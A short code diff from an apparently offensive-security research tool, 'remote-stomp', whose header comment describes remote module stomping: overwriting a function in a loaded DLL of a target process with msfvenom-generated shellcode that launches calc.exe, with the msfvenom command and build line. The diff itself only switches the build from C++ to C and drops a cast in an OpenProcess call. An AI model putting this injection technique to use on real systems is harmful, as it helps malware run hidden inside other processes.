@@ -2,7 +2,7 @@
 * remote module stomping: locate a sacrificial DLL in the process memory, locate a function to stomp (it'll be within the .text section, this is lazy)
 * & inject calc.exe msfvenom shellcode into the target buffer, toggling the memory protection between RW and RWX
 * shellcode: msfvenom -p windows/x64/exec CMD=calc.exe -f C EXITFUNC=thread
-* compile: cl.exe remote-stomp.cpp ..\includes\peb-eat-utils.cpp ..\includes\utils.cpp /W0
+* compile: cl.exe remote-stomp.c ..\includes\peb-eat-utils.c ..\includes\utils.c /W0
 */
 #include <windows.h>
 #include <stdio.h>
@@ -126,7 +126,7 @@ int main(int argc, char *argv[]) {
     printf("[*] Running PI with target PID: %u\n", pid);
 
     // Open a handle to the target process
-    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
+    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (pHandle == NULL) {
         printf("Failed to acquire process handle!\n");
         if (nopMode) free(writeBuffer);
